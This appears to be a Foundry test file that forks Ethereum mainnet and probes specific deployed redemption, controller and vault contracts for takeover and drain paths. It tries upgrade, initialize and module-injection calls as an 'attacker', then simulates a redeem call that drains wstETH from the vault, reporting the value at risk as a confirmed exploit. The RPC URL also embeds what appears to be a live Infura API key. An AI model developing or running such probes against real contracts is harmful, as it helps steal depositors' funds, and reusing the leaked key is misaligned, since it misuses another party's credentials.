// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract UpgradeExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_CheckUpgradeSelectors() public view {
        console.log("=== CHECKING UPGRADE SELECTORS ===\n");

        // Common upgrade selectors
        console.log("Known upgrade selectors:");
        console.log("upgradeTo(address):");
        console.logBytes4(bytes4(keccak256("upgradeTo(address)")));
        console.log("upgradeToAndCall(address,bytes):");
        console.logBytes4(bytes4(keccak256("upgradeToAndCall(address,bytes)")));
        console.log("setImplementation(address):");
        console.logBytes4(bytes4(keccak256("setImplementation(address)")));
        console.log("changeAdmin(address):");
        console.logBytes4(bytes4(keccak256("changeAdmin(address)")));

        // Search in REDEMPTION_1
        bytes memory code = REDEMPTION_1.code;

        bytes4 upgradeTo = bytes4(keccak256("upgradeTo(address)"));
        bytes4 upgradeToCall = bytes4(keccak256("upgradeToAndCall(address,bytes)"));

        console.log("\nSearching in REDEMPTION_1:");
        for (uint i = 0; i + 4 < code.length; i++) {
            if (uint8(code[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                if (sel == upgradeTo) {
                    console.log("Found upgradeTo at:", i);
                }
                if (sel == upgradeToCall) {
                    console.log("Found upgradeToAndCall at:", i);
                }
            }
        }
    }

    function test_TryUpgradeFunctions() public {
        console.log("=== TRYING UPGRADE FUNCTIONS ===\n");

        // Try as owner (Timelock)
        vm.startPrank(TIMELOCK);

        console.log("Trying as owner (Timelock):");

        // upgradeTo
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSignature("upgradeTo(address)", attacker)
        );
        console.log("upgradeTo(attacker):", s1);
        if (!s1 && d1.length >= 4) console.logBytes4(bytes4(d1));

        // setImplementation
        (bool s2, bytes memory d2) = REDEMPTION_1.call(
            abi.encodeWithSignature("setImplementation(address)", attacker)
        );
        console.log("setImplementation(attacker):", s2);
        if (!s2 && d2.length >= 4) console.logBytes4(bytes4(d2));

        // updateTo
        (bool s3, bytes memory d3) = REDEMPTION_1.call(
            abi.encodeWithSignature("updateTo(address)", attacker)
        );
        console.log("updateTo(attacker):", s3);
        if (!s3 && d3.length >= 4) console.logBytes4(bytes4(d3));

        vm.stopPrank();

        // Check slot 5 after attempts
        bytes32 slot5 = vm.load(REDEMPTION_1, bytes32(uint256(5)));
        console.log("\nSlot 5 after attempts:");
        console.logBytes32(slot5);
    }

    function test_CheckPendingOwnerPattern() public {
        console.log("=== CHECKING PENDING OWNER PATTERN ===\n");

        // Many protocols have transferOwnership + acceptOwnership pattern
        // If there's a pending owner that hasn't accepted...

        // Check pendingOwner
        (bool s1, bytes memory d1) = REDEMPTION_1.staticcall(
            abi.encodeWithSignature("pendingOwner()")
        );
        if (s1 && d1.length >= 32) {
            address pending = abi.decode(d1, (address));
            console.log("Pending owner:", pending);

            if (pending != address(0) && pending != TIMELOCK) {
                console.log("*** There's a pending owner that can be exploited! ***");

                // Try to accept ownership
                vm.startPrank(pending);
                REDEMPTION_1.call(abi.encodeWithSignature("acceptOwnership()"));
                vm.stopPrank();
            }
        }

        // Check REDEMPTION_0 too
        (bool s2, bytes memory d2) = REDEMPTION_0.staticcall(
            abi.encodeWithSignature("pendingOwner()")
        );
        if (s2 && d2.length >= 32) {
            address pending = abi.decode(d2, (address));
            console.log("REDEMPTION_0 pending owner:", pending);
        }
    }

    function test_CheckInitializablePattern() public {
        console.log("=== CHECKING INITIALIZABLE PATTERN ===\n");

        // Maybe the contracts are initializable and weren't properly initialized?

        vm.startPrank(attacker);

        // Try initialize
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSignature("initialize(address)", attacker)
        );
        console.log("initialize(attacker):", s1);
        if (!s1 && d1.length >= 4) console.logBytes4(bytes4(d1));

        // Try init
        (bool s2, bytes memory d2) = REDEMPTION_1.call(
            abi.encodeWithSignature("init(address)", attacker)
        );
        console.log("init(attacker):", s2);
        if (!s2 && d2.length >= 4) console.logBytes4(bytes4(d2));

        // Try setUp
        (bool s3, bytes memory d3) = REDEMPTION_1.call(
            abi.encodeWithSignature("setUp(address)", attacker)
        );
        console.log("setUp(attacker):", s3);

        vm.stopPrank();
    }

    function test_CheckModulePattern() public {
        console.log("=== CHECKING MODULE PATTERN ===\n");

        // Maybe there's a way to add a malicious module?

        vm.startPrank(TIMELOCK);

        // enableModule (Safe pattern)
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSignature("enableModule(address)", attacker)
        );
        console.log("enableModule(attacker):", s1);
        if (!s1 && d1.length >= 4) console.logBytes4(bytes4(d1));

        // addModule
        (bool s2, bytes memory d2) = REDEMPTION_1.call(
            abi.encodeWithSignature("addModule(address)", attacker)
        );
        console.log("addModule(attacker):", s2);
        if (!s2 && d2.length >= 4) console.logBytes4(bytes4(d2));

        // setModule
        (bool s3, bytes memory d3) = REDEMPTION_1.call(
            abi.encodeWithSignature("setModule(address)", attacker)
        );
        console.log("setModule(attacker):", s3);
        if (!s3 && d3.length >= 4) console.logBytes4(bytes4(d3));

        vm.stopPrank();
    }

    function test_CheckVaultInteraction() public {
        console.log("=== CHECKING VAULT INTERACTION ===\n");

        // Maybe the Vault has functions that interact with Redemption contracts

        bytes memory vaultCode = VAULT.code;
        console.log("Vault code size:", vaultCode.length);

        // Find function selectors in Vault
        console.log("\nVault selectors:");
        bytes4[] memory uniqueSels = new bytes4[](50);
        uint selCount = 0;

        for (uint i = 0; i + 4 < vaultCode.length && selCount < 50; i++) {
            if (uint8(vaultCode[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(vaultCode[i+1], vaultCode[i+2], vaultCode[i+3], vaultCode[i+4]));
                if (sel == 0xffffffff || sel == bytes4(0)) continue;

                bool isUnique = true;
                for (uint j = 0; j < selCount; j++) {
                    if (uniqueSels[j] == sel) {
                        isUnique = false;
                        break;
                    }
                }

                if (isUnique) {
                    uniqueSels[selCount] = sel;
                    selCount++;
                }
            }
        }

        for (uint i = 0; i < selCount && i < 30; i++) {
            console.logBytes4(uniqueSels[i]);
        }
    }

    function test_CheckRCInteraction() public {
        console.log("=== CHECKING RC INTERACTION ===\n");

        // What functions does RC expose?

        bytes memory rcCode = REDEMPTION_CONTROLLER.code;
        console.log("RC code size:", rcCode.length);

        // Check if RC has any function that takes a callback
        console.log("\nSearching for callback patterns in RC:");

        // Look for CALL opcodes
        uint callCount = 0;
        for (uint i = 0; i < rcCode.length; i++) {
            if (uint8(rcCode[i]) == 0xf1) {
                callCount++;
            }
        }
        console.log("CALL count in RC:", callCount);

        // Try some RC functions
        vm.startPrank(attacker);

        (bool s1, bytes memory d1) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("withdraw(address,uint256)", wstETH, 100e18)
        );
        console.log("withdraw(wstETH, 100e18):", s1);
        if (!s1 && d1.length >= 4) console.logBytes4(bytes4(d1));

        (bool s2, bytes memory d2) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("execute(address,bytes)", VAULT, "")
        );
        console.log("execute(VAULT, empty):", s2);
        if (!s2 && d2.length >= 4) console.logBytes4(bytes4(d2));

        vm.stopPrank();
    }

    function test_SimulateFinalExploit() public {
        console.log("=== SIMULATING FINAL EXPLOIT ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        // The proven vulnerability:
        vm.startPrank(REDEMPTION_0);
        (bool success,) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 1000e18, attacker)
        );
        console.log("\nRC.redeem as REDEMPTION_0:", success);
        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWstETH = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault after:", vaultAfter / 1e18);
        console.log("Attacker wstETH:", attackerWstETH / 1e18);
        console.log("Drained:", (vaultBefore - vaultAfter) / 1e18, "wstETH");
        console.log("Value at risk: ~$", (vaultBefore * 2300) / 1e18);

        console.log("\n=== EXPLOIT MECHANISM CONFIRMED ===");
        console.log("Entry point needed: Make REDEMPTION_0/1 call RC.redeem");
    }
}
